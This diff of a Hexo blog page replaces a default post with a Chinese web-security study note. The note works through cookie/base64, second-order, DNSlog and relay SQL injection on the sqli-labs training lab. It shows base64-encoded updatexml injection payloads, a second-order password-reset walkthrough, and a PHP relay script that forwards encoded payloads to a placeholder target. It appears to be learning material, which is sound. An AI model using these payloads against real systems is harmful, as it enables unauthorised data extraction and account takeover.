@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hello World, 爱睡懒觉的道士">
+    <meta name="keywords" content="web安全日志-017, 爱睡懒觉的道士">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hello World | 爱睡懒觉的道士</title>
+    <title>web安全日志-017 | 爱睡懒觉的道士</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -324,12 +324,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hello World</h1>
+                    <h1 class="description center-align post-title">web安全日志-017</h1>
                 </div>
             </div>
         </div>
@@ -443,12 +443,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                web安全
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -457,7 +470,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-09-13
+                    2023-09-30
                 </div>
                 
 
@@ -466,14 +479,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    73
+                    589
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -493,19 +506,83 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span>
+                <h2 id="WEB漏洞-二次-加解密-DNS等注入"><a href="#WEB漏洞-二次-加解密-DNS等注入" class="headerlink" title="WEB漏洞-二次,加解密,DNS等注入"></a><font size="6"><strong>WEB漏洞-二次,加解密,DNS等注入</strong></font></h2><span id="more"></span>
+
+<h3 id="一、加解密注入"><a href="#一、加解密注入" class="headerlink" title="一、加解密注入"></a><font size="5"><strong>一、加解密注入</strong></font></h3><p>sqlilabs-less21-cookie&amp;加解密注入(实际案例)<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/1.png"></p>
+<p>抓取cookie数据包</p>
+<pre class=" language-bash"><code class="language-bash">GET /Less-21/index.php HTTP/1.1
+Host: 10.1.1.133
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8
+Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2
+Accept-Encoding: gzip, deflate
+Referer: http://10.1.1.133/Less-21/index.php
+Connection: close
+Cookie: uname<span class="token operator">=</span>YWRtaW4%3D
+Upgrade-Insecure-Requests: 1
 </code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server
+<p>YWRtaW4%3D这是一个base64加密的字符串其中%3D是编码中的&#x3D;符号，把他发送到编码模块当中解密,得到明文<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/2.png"></p>
+<p>发现这个是注入点需要将原来的注入方式重新加密发送给服务器。<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/3.png"></p>
+<p>也就是说admin’ and 1&#x3D;1加密之后的值是YWRtaW4nIGFuZCAxPTE&#x3D;<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/4.png"></p>
+<p>获取数据库名称admin’ or updatexml(1,concat(0x7e,(database())),0) or ‘加密后cookie值Cookie: uname&#x3D;YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChkYXRhYmFzZSgpKSksMCkgb3IgJwo&#x3D;<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/5.png"><br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/6.png"></p>
+<h3 id="二、二次注入"><a href="#二、二次注入" class="headerlink" title="二、二次注入"></a><font size="5"><strong>二、二次注入</strong></font></h3><p>二次注入一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/7.png"></p>
+<p>sqlilabs-less24-post登陆框&amp;二次注入<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/8.png"></p>
+<p>数据库中查询</p>
+<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>
++----+----------+------------+
+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password   <span class="token operator">|</span>
++----+----------+------------+
+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb       <span class="token operator">|</span>
+<span class="token operator">|</span>  2 <span class="token operator">|</span> Angelina <span class="token operator">|</span> I-kill-you <span class="token operator">|</span>
+<span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy    <span class="token operator">|</span> p@ssword   <span class="token operator">|</span>
+<span class="token operator">|</span>  4 <span class="token operator">|</span> secure   <span class="token operator">|</span> crappy     <span class="token operator">|</span>
+<span class="token operator">|</span>  5 <span class="token operator">|</span> stupid   <span class="token operator">|</span> stupidity  <span class="token operator">|</span>
+<span class="token operator">|</span>  6 <span class="token operator">|</span> superman <span class="token operator">|</span> genious    <span class="token operator">|</span>
+<span class="token operator">|</span>  7 <span class="token operator">|</span> batman   <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span>
+<span class="token operator">|</span>  8 <span class="token operator">|</span> admin    <span class="token operator">|</span> admin      <span class="token operator">|</span>
+<span class="token operator">|</span>  9 <span class="token operator">|</span> admin1   <span class="token operator">|</span> admin1     <span class="token operator">|</span>
+<span class="token operator">|</span> 10 <span class="token operator">|</span> admin2   <span class="token operator">|</span> admin2     <span class="token operator">|</span>
+<span class="token operator">|</span> 11 <span class="token operator">|</span> admin3   <span class="token operator">|</span> admin3     <span class="token operator">|</span>
+<span class="token operator">|</span> 12 <span class="token operator">|</span> dhakkan  <span class="token operator">|</span> dumbo      <span class="token operator">|</span>
+<span class="token operator">|</span> 14 <span class="token operator">|</span> admin4   <span class="token operator">|</span> admin4     <span class="token operator">|</span>
+<span class="token operator">|</span> 15 <span class="token operator">|</span> admin'<span class="token comment" spellcheck="true">#  | admin      |</span>
++----+----------+------------+
+14 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
 </code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate
+<p>登录用户修改密码<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/9.png"></p>
+<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>
++----+----------+------------+
+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password   <span class="token operator">|</span>
++----+----------+------------+
+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb       <span class="token operator">|</span>
+<span class="token operator">|</span>  2 <span class="token operator">|</span> Angelina <span class="token operator">|</span> I-kill-you <span class="token operator">|</span>
+<span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy    <span class="token operator">|</span> p@ssword   <span class="token operator">|</span>
+<span class="token operator">|</span>  4 <span class="token operator">|</span> secure   <span class="token operator">|</span> crappy     <span class="token operator">|</span>
+<span class="token operator">|</span>  5 <span class="token operator">|</span> stupid   <span class="token operator">|</span> stupidity  <span class="token operator">|</span>
+<span class="token operator">|</span>  6 <span class="token operator">|</span> superman <span class="token operator">|</span> genious    <span class="token operator">|</span>
+<span class="token operator">|</span>  7 <span class="token operator">|</span> batman   <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span>
+<span class="token operator">|</span>  8 <span class="token operator">|</span> admin    <span class="token operator">|</span> 123456     <span class="token operator">|</span>
+<span class="token operator">|</span>  9 <span class="token operator">|</span> admin1   <span class="token operator">|</span> admin1     <span class="token operator">|</span>
+<span class="token operator">|</span> 10 <span class="token operator">|</span> admin2   <span class="token operator">|</span> admin2     <span class="token operator">|</span>
+<span class="token operator">|</span> 11 <span class="token operator">|</span> admin3   <span class="token operator">|</span> admin3     <span class="token operator">|</span>
+<span class="token operator">|</span> 12 <span class="token operator">|</span> dhakkan  <span class="token operator">|</span> dumbo      <span class="token operator">|</span>
+<span class="token operator">|</span> 14 <span class="token operator">|</span> admin4   <span class="token operator">|</span> admin4     <span class="token operator">|</span>
+<span class="token operator">|</span> 15 <span class="token operator">|</span> admin'<span class="token comment" spellcheck="true">#  | admin      |</span>
++----+----------+------------+
+14 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>
 </code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy
+<p>最后我们看到的是将admin的账户密码修改为了123456而admin’#并没有发生改变，原因是代码执行的过程中将’#没有过滤直接带入执行导致’与前面的代码闭合而#将后面的代码给注释。</p>
+<h3 id="三、dnslog注入"><a href="#三、dnslog注入" class="headerlink" title="三、dnslog注入"></a><font size="5"><strong>三、dnslog注入</strong></font></h3><p>涉及资源：<a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a><br>参考资料：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12322839.html">https://www.cnblogs.com/xhds/p/12322839.html</a><br>使用DnsLog盲注仅限于windos环境。</p>
+<p>不知道啥子个情况dnslog在windows还是linux上就是没法运行缺少各种的库文件。所以先暂时放一段</p>
+<h3 id="四、中转注入"><a href="#四、中转注入" class="headerlink" title="四、中转注入"></a><font size="5"><strong>四、中转注入</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+<span class="token variable">$url</span><span class="token operator">=</span><span class="token string">'http://xxxx/job_bystjb/yjs_byszjs.asp?id='</span><span class="token punctuation">;</span>
+<span class="token variable">$payload</span><span class="token operator">=</span>base64_encode<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span>
+<span class="token variable">$urls</span><span class="token operator">=</span><span class="token variable">$url</span><span class="token keyword">.</span><span class="token variable">$payload</span><span class="token punctuation">;</span>
+file_get_contents<span class="token punctuation">(</span><span class="token variable">$urls</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$urls</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
 </code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 
                 
             </div>
@@ -532,7 +609,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2023/09/13/hello-world/">http://example.com/2023/09/13/hello-world/</a>
+                    <a href="http://example.com/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/">http://example.com/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -569,7 +646,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -741,25 +822,62 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/09/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-001/">
+                <a href="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="web安全日志--001">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="web安全日志-018">
                         
-                        <span class="card-title">web安全日志--001</span>
+                        <span class="card-title">web安全日志-018</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            基础入门-概念名词
+                            
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-09-14
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-01
                         </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            爱睡懒觉的道士
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="web安全日志-016">
+                        
+                        <span class="card-title">web安全日志-016</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            WEB漏洞-查询方式及报错盲注
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-29
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -780,44 +898,6 @@
                     </a>
                     
                 </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/09/13/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-13
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            爱睡懒觉的道士
-                            
-                        </span>
-                    </div>
-                </div>
-
                 
             </div>
         </div>
